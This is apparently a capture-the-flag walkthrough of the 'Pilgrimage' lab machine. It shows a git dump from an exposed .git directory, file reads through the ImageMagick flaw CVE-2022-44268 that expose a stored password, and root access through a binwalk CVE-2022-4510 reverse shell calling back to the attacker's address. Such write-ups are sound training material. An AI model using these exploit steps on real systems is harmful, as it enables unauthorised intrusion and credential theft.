# Default Information
IP Address: 10.10.11.219
OS: Linux
# Enumeration
Before we start, let us add the hosts and IP address to our /etc/hosts file

```
10.10.11.219 pilgrimage.htb
```
## Nmap
Executing a nmap scan, we can see that this hosts only has exposed port 22 and port 80. However, the nmap scan also shows that there is an exposed ```/.git``` endpoint that is exposed to the public on port 80

```
22/tcp    open     ssh           syn-ack     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d14e293c708669b4d72cc80b486e9804 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp    open     http          syn-ack     nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
```

However, when we do a curl command on the ```/.git``` endpoint,  we would realize that this gives us a 403 request. At the same time, we realize that we are able to access the ```/.git/HEAD``` endpoint and this returns us a status code of 200. This means that we will be able to dump some git repositories from this endpoint

```
┌──(kali㉿kali)-[~]
└─$ curl -ikL http://10.10.11.219:80/.git/
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Sat, 08 Jul 2023 05:24:51 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://pilgrimage.htb/.git/

HTTP/1.1 403 Forbidden
Server: nginx/1.18.0
Date: Sat, 08 Jul 2023 05:24:52 GMT
Content-Type: text/html
Content-Length: 153
Connection: keep-alive

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ curl -ikL http://10.10.11.219:80/.git/HEAD
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Sat, 08 Jul 2023 05:25:31 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://pilgrimage.htb/.git/HEAD

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 08 Jul 2023 05:25:33 GMT
Content-Type: application/octet-stream
Content-Length: 23
Last-Modified: Wed, 07 Jun 2023 10:09:42 GMT
Connection: keep-alive
ETag: "64805766-17"
Accept-Ranges: bytes

ref: refs/heads/master
```

# Extracting Git Repositories
Since we know that we are able to extract git repositories from the ```/.git``` endpoint, we will use [GitTools](https://github.com/internetwache/GitTools.git) to extract and download the repositories
```
# Dump git index
./gitdumper.sh http://pilgrimage.htb/.git/ /home/kali/Desktop/pilgrimage
# Extract the repos
./extractor.sh /home/kali/Desktop/pilgrimage /home/kali/Desktop/pilgrimage/repos
```

# CVE-2022-44268
In the git repository, we are able to find a ```magick``` binary and we can find out that the version of the binary used is ```ImageMagick 7.1.0-49 beta```

```
┌──(kali㉿kali)-[~/Desktop/pilgrimage/repos/0-e1a40beebc7035212efdcb15476f9c994e3634a7]
└─$ ls -la && ./magick -version
total 26972
drwxr-xr-x 4 kali kali     4096 Jul  7 21:37 .
drwxr-xr-x 3 kali kali     4096 Jul  7 21:37 ..
drwxr-xr-x 6 kali kali     4096 Jul  7 21:37 assets
-rw-r--r-- 1 kali kali      205 Jul  7 21:37 commit-meta.txt
-rw-r--r-- 1 kali kali     5538 Jul  7 21:37 dashboard.php
-rw-r--r-- 1 kali kali     9250 Jul  7 21:37 index.php
-rw-r--r-- 1 kali kali     6822 Jul  7 21:37 login.php
-rw-r--r-- 1 kali kali       98 Jul  7 21:37 logout.php
-rwxr-xr-x 1 kali kali 27555008 Jul  7 21:37 magick
-rw-r--r-- 1 kali kali     6836 Jul  7 21:37 register.php
drwxr-xr-x 4 kali kali     4096 Jul  7 21:37 vendor
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Checking the version of Magick that is being used, we find out that this version if vulnerable to CVE-2022-44268 which is a LFI vulnerability. Using the script from [here](https://github.com/Sybil-Scan/imagemagick-lfi-poc), we are able to generate a malicious image that can leak out ```/etc/passwd``` file

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/pilgrimage/imagemagick-lfi-poc]
└─$ python3 generate.py -f "/etc/passwd" -o exploit.png 

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png
```

Next, we will create an account on http://pilgrimage.htb and login to the new user. Afterwards, we will upload the malicious image and download the new image that is created.

```
wget http://pilgrimage.htb/shrunk/64a8c693e5ade.png
```

Lastly, we will have to extract the contents of the downloaded image and convert it into utf-8 format

```
# Obtain the hex output
identify -verbose 64a8cf0bba3e3.png
# Convert hex output to utf-8
python3 -c 'bytes.fromhex(<hex output>).decode("utf-8")'
```

From the source code that we have extracted earlier, we notice that there is an sqlite database file at ```/var/db/pilgrimage```

```
function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
}
```
We can then make use of the LFI to read the database file and download it to our local machine. We will use the steps described above to obtain the hex values of the file. However, we will have to make a tweak to the last command. Instead of using python3 to obtain the utf-8 value, we will have to use ```xxd``` to save the hex output into a file

```
# Obtain hex output
identify -verbose <image file>
# Save hex output into sqlite file
echo "<hex>" | xxd -r -p > pilgrimage.sqlite
```

Next, we will then use sqlite3 to dumb the contents of the database file. From there, we are able to obtain the credentials for ```emily```

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/pilgrimage/imagemagick-lfi-poc]
└─$ sqlite3 store       
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
INSERT INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;
sqlite> 
```

# Obtaining user flag
Using the credentials of ```emily``` that we have obtained earlier, we can gain SSH access and read the contents of the user flag.

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/pilgrimage/imagemagick-lfi-poc]
└─$ ssh emily@10.10.11.219
emily@10.10.11.219's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ cat /home/emily/user.txt
<user flag>
```

# Privilege Escalation
Looking at the processes that are running in the background, we manage to find a /usr/sbin/malwarecheck.sh that is running in the background

```
root         728  0.0  0.0   6816  2996 ?        Ss   04:06   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

Checking the contents of malwarescan.sh, we realize that what this script is essentially doing is that when a new file is moved/copied to /var/www/pilgrimage.htb/shrunk, it checks if the file is either a executable script or microsoft executable and deletes them if they are

```
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Checking the version of binwalk used, we realized that this version of binwalk is vulnerable to CVE-2022-4510
```
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ /usr/local/bin/binwalk --help

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
...
```

Using the script from [here](https://github.com/adhikara13/CVE-2022-4510-WalkingPath.git), we are able to create a vulnerable image that can create a reverse shell connection to our local listener

```
python3 walkingpath.py reverse test.png 10.10.16.2 3000
```

Uploading the file to /var/www/pilgrimage.htb/shrunk will then cause the reverse shell connection to be made to our listener

```
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.16.2:443/binwalk_exploit.png
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ cp *.png *.sh
```

# Obtaining root flag

```
root@pilgrimage:~/quarantine# cat /root/root.txt
cat /root/root.txt
<redacted root flag>
```
